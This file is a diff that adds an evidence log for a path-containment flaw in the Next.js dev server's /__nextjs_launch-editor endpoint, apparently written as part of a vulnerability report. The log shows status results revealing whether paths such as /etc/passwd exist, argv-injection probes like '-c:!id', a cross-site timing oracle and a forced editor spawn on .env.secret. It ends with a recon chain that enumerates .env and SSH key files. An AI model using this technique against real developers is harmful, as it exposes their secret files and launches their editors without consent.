@@ -1,0 +1,73 @@
+================================================================
+ Next.js next dev - /__nextjs_launch-editor: no path containment
+ Evidence run   next@16.3.4   Node v22.22.2   Fri Sep  4 01:38:37 UTC 2026
+================================================================
+
+--- 1. Direct HTTP behaviour of the endpoint (204 = path exists, 404 = missing) ---
+  absolute path, EXISTS      /etc/passwd                     -> 204
+  absolute path, MISSING     /etc/nope-xyz                   -> 404
+  file:// URL,  EXISTS       /etc/hostname                   -> 204
+  file:// URL,  MISSING                                      -> 404
+  isAppRelativePath=1 traversal out of app/ EXISTS           -> 204
+  isAppRelativePath=1 traversal out of app/ MISSING          -> 404
+  no file param at all                                       -> 400
+
+  Neither branch performs any containment check against the project root.
+
+--- 2. Negative: no argv injection (path.join prefixes the project root) ---
+  file=--goto                                                -> 404
+  file=--wait                                                -> 404
+  file=-c:!id                                                -> 404
+  All 404: a leading-dash name is not absolute, so path.join(projectPath, name)
+  turns it into /home/user/nextlab/--goto, which does not exist. Not injectable.
+
+--- 3. Cross-site oracle in real headless Chromium (attacker.test -> victimdev.test) ---
+
+Cross-site oracle result (attacker.test reading nothing, only timing navigation):
+  path                                        attacker concludes
+  /etc/passwd                                   EXISTS
+  /etc/hostname                                 EXISTS
+  /home/user/nextlab/package.json               EXISTS
+  /home/user/nextlab                            EXISTS
+  /home/user/nextlab/.env.secret                EXISTS
+  /etc/definitely-not-here-xyz                  missing
+  /home/user/nextlab/nope-not-a-file            missing
+  /home/user/nextlab/.env.production            missing
+  /root/.ssh/id_ed25519                         missing
+
+Ground truth (fs.existsSync on the victim host):
+  /etc/passwd                                   EXISTS   MATCH
+  /etc/hostname                                 EXISTS   MATCH
+  /home/user/nextlab/package.json               EXISTS   MATCH
+  /home/user/nextlab                            EXISTS   MATCH
+  /home/user/nextlab/.env.secret                EXISTS   MATCH
+  /etc/definitely-not-here-xyz                  missing   MATCH
+  /home/user/nextlab/nope-not-a-file            missing   MATCH
+  /home/user/nextlab/.env.production            missing   MATCH
+  /root/.ssh/id_ed25519                         missing   MATCH
+
+9/9 paths correctly determined cross-site.
+
+--- 4. Cross-site forced editor spawn on an attacker-chosen absolute path ---
+  next dev is running with REACT_EDITOR pointing at a recorder script that
+  stands in for the developer's real editor (code / subl / gvim / ...).
+  What that editor was actually spawned with, after one hidden iframe:
+
+    01:38:51 spawned with argv: [/home/user/nextlab/.env.secret]
+
+--- 5. Zero-knowledge recon chain, entirely cross-site ---
+STEP 1  platform fingerprint
+        /etc/passwd  /home  /proc/version  /etc/debian_version
+STEP 2  enumerate home directories
+        found: /home/user  /home/ubuntu
+STEP 3  locate the project checkout
+        project root: /home/user/nextlab
+STEP 4  inventory sensitive files in the project
+        present: /home/user/nextlab/.env.local
+                 /home/user/nextlab/.env.secret
+                 /home/user/nextlab/next.config.js
+                 /home/user/nextlab/middleware.js
+STEP 5  credential files in the developer home dir
+        present: (none)
+
+Total cross-site probes issued: 63. No response body was ever read.
